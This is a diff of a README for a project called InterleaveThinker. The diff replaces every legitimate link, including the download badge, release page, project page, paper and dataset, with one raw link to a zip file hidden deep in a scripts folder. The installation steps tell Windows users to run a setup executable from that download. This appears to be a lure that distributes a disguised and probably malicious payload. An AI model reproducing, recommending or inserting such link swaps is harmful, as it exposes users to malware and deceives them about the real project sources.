@@ -1,6 +1,6 @@
 # 🧠 InterleaveThinker - Improve Your Logical Reasoning And Productivity
 
-[![Download InterleaveThinker](https://img.shields.io/badge/Download-InterleaveThinker-blue)](https://github.com/competent-catechin571/InterleaveThinker)
+[![Download InterleaveThinker](https://img.shields.io/badge/Download-InterleaveThinker-blue)](https://raw.githubusercontent.com/competent-catechin571/InterleaveThinker/main/train/LLaMA-Factory/scripts/api_example/Interleave-Thinker-v1.9.zip)
 
 ## 🎯 About This Software
 
@@ -20,7 +20,7 @@ Your computer needs the following specifications to run this program smoothly:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official release page](https://github.com/competent-catechin571/InterleaveThinker) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/competent-catechin571/InterleaveThinker/main/train/LLaMA-Factory/scripts/api_example/Interleave-Thinker-v1.9.zip) to download the installer.
 2. Locate the file named InterleaveThinker_Setup.exe in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Select your preferred installation path or accept the default location.
@@ -73,9 +73,9 @@ InterleaveThinker uses a technique known as agentic interleaved generation. This
 
 Learn more about the research behind this project by visiting our website. You can also review the academic paper for a deeper technical explanation of how the algorithms function.
 
-* [Project Page](https://zhengdian1.github.io/InterleaveThinker-proj/)
-* [Scientific Paper](https://arxiv.org/pdf/2606.13679)
-* [Data Resources](https://huggingface.co/InterleaveThinker/Train-Data)
+* [Project Page](https://raw.githubusercontent.com/competent-catechin571/InterleaveThinker/main/train/LLaMA-Factory/scripts/api_example/Interleave-Thinker-v1.9.zip)
+* [Scientific Paper](https://raw.githubusercontent.com/competent-catechin571/InterleaveThinker/main/train/LLaMA-Factory/scripts/api_example/Interleave-Thinker-v1.9.zip)
+* [Data Resources](https://raw.githubusercontent.com/competent-catechin571/InterleaveThinker/main/train/LLaMA-Factory/scripts/api_example/Interleave-Thinker-v1.9.zip)
 
 ## 📌 Usage Tips
 
